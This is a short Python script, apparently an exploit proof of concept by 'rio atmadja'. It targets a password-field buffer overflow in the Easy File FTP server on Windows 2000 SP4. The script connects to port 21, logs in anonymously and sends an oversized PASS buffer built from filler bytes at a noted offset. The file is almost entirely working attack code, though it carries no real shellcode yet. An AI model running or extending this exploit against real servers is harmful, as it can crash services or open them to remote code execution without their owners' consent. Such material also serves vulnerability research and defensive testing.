#!/usr/bin/python

# Name:    rio atmadja
# Program: easy file ftp 
# Target : Windows 2000 SP4
# Vuln   : Password is vulnerable to BOF 

import os
import sys
import time
import struct
import socket

def ExploitFTP(target):


	sockAddr = (target, 21)
	tsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	tsock.connect(sockAddr)
	response = tsock.recv(1024)
	print response

	# offset = 2563 	
	payload = '\x41' * 2559 + '\x42' * 4 + '\x43' * 4 + '\x90' * 4 + '\x44' * 929 

	user = 'USER anonymous\r\n'
	tsock.send(user)
	response = tsock.recv(1024)

	passwd = 'PASS \x2c' + payload + '\r\n'
	tsock.send(passwd)
	response = tsock.recv(1024)


if __name__ == '__main__':
	try:
	       target = sys.argv[1]
	except IndexError:
	       print 'Usage: %s <target>' % sys.argv[0]
	       sys.exit(-1)

	ExploitFTP(target)

